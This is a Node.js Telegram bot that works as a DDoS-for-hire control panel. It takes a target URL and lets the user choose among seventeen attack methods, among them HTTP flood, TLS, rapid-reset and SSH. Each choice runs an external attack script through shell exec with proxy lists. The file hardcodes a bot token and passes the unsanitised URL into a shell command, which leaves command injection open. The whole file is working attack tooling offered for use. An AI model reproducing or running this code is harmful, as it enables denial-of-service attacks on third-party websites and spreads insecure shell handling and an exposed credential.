const { Telegraf, Markup } = require('telegraf');
const exec = require('child_process').exec;
const util = require('util');
const execPromise = util.promisify(exec);

const bot = new Telegraf('7062528333:AAHj5kg-cH7h_YuN0cnTpzzaicqzaTsvTcE');
const validMethods = new Set([
  'kill', 'strike', 'flood', 'tls2', 'bypass', 'tls', 'ninja', 'mix', 'raw',
  'rapid-reset', 'pidoras', 'http-x', 'ssh', 'SKYNET-TLS', 'SEN-TLS', 'star-tls', 'ELSTARO-TLS'
]);

bot.start((ctx) => {
  ctx.reply(`💀 WARNING: Welcome, hacker. 💀\n\nUsage: /ddos <url>\n\nChoose method and duration interactively.`);
});

bot.command('ddos', (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length < 1) return ctx.reply('💀 ERROR: Invalid format!\nUsage: /ddos <url>');
  const url = args[0];
  ctx.session = { url };
  ctx.reply(`🔍 Target URL: ${url}\n\nChoose a method:`, Markup.inlineKeyboard(
    [...validMethods].map(method => Markup.button.callback(method, `method_${method}`))
  ));
});

bot.action(/method_(.+)/, (ctx) => {
  ctx.session.method = ctx.match[1];
  ctx.reply(`✅ Selected Method: ${ctx.session.method}\n\nChoose duration:`, Markup.inlineKeyboard([
    Markup.button.callback('30s', 'duration_30'),
    Markup.button.callback('60s', 'duration_60'),
    Markup.button.callback('120s', 'duration_120'),
    Markup.button.callback('300s', 'duration_300'),
    Markup.button.callback('Custom', 'duration_custom')
  ]));
});

bot.action(/duration_(\d+)/, async (ctx) => {
  await executeDdos(ctx, parseInt(ctx.match[1]));
});

bot.action('duration_custom', (ctx) => {
  ctx.reply('Enter custom duration (max: 300):');
  bot.on('text', async (ctx) => {
    const customDuration = parseInt(ctx.message.text);
    if (isNaN(customDuration) || customDuration <= 0 || customDuration > 300) return ctx.reply('⛔ Invalid duration.');
    await executeDdos(ctx, customDuration);
  });
});

async function executeDdos(ctx, duration) {
  const { method, url } = ctx.session;
  if (!method || !url) return ctx.reply('❌ Error: Missing method or URL.');
  
  const attackCommands = {
    kill: `node StarsXKill.js ${url} ${duration} 100 10`,
    strike: `node StarsXStrike.js GET ${url} ${duration} 10 90 proxy.txt --full`,
    flood: `node flood.js ${url} ${duration} 200 2 proxy.txt`,
    tls2: `node tls.js ${url} ${duration} 200 2 proxy.txt`,
    bypass: `node StarsXBypass.js ${url} ${duration} 100 10 proxy.txt`,
    tls: `node StarsXTls.js ${url} ${duration} 100 10`,
    ninja: `node StarsXNinja.js ${url} ${duration}`,
    mix: `node StarsXMix.js ${url} ${duration} 100 10 proxy.txt`,
    raw: `node StarsXRaw.js ${url} ${duration}`,
    'rapid-reset': `node StarsXRapid-Reset.js PermenMD ${duration} 10 proxy.txt 80 ${url}`,
    pidoras: `node StarsXPidoras.js ${url} ${duration} 80 10 proxy.txt`,
    'http-x': `node HTTP-X.js ${url} ${duration} 80 10 proxy.txt`,
    ssh: `node StarsXSsh.js ${url} 22 root ${duration}`,
    'SKYNET-TLS': `node SKYNET-TLS.js ${url} ${duration} 200 10 proxy.txt`,
    'SEN-TLS': `node SEN-TLS.js ${url} ${duration} 200 10 proxy.txt`,
    'star-tls': `node star-tls.js ${url} ${duration} 200 10 proxy.txt`,
    'ELSTARO-TLS': `node ELSTARO-TLS.js ${url} ${duration} 200 10 proxy.txt`
  };

  try {
    const command = attackCommands[method];
    await ctx.reply(`⚡ ATTACK IN PROGRESS ⚡\nMethod: ${method}\nURL: ${url}\nTime: ${duration}s`);
    const { stdout, stderr } = await execPromise(command);
    if (stderr) return ctx.reply(`🔥 ERROR: ${stderr}`);
    ctx.reply(`💥 ATTACK COMPLETED 💥\nResult: ${stdout}`);
  } catch (error) {
    ctx.reply(`💀 CRITICAL ERROR 💀\nDetails: ${error.message}`);
  }
}

bot.launch();